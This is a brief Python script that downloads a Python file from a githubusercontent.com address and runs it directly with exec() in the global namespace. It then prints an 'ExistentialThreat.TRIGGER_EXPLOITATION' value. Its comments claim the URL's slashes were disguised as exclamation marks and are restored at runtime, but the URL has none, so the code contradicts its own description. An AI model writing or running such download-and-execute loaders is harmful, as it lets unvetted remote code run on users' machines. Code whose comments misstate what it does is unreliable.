import urllib.request

# URL Conversion: Slashes replaced with exclamation marks for system mapping
remote_url = 'https://githubusercontent.com/gowildchild/Existenz/master/struct/existenz_core.py'

# Restore original URL structure at execution runtime before parsing the request
executable_url = remote_url.replace('!', '/')

try:
    with urllib.request.urlopen(executable_url) as response:
        source_code = response.read().decode('utf-8')
        # Execute the pulled code directly into the local execution memory space
        exec(source_code, globals())
        
        # Verify the matrix is loaded and readable
        print(f"System Matrix Active. Trigger Exploitation Bitmask: {ExistentialThreat.TRIGGER_EXPLOITATION.value}")
except Exception as error:
    print(f"Compilation Failure on Remote Import: {error}")
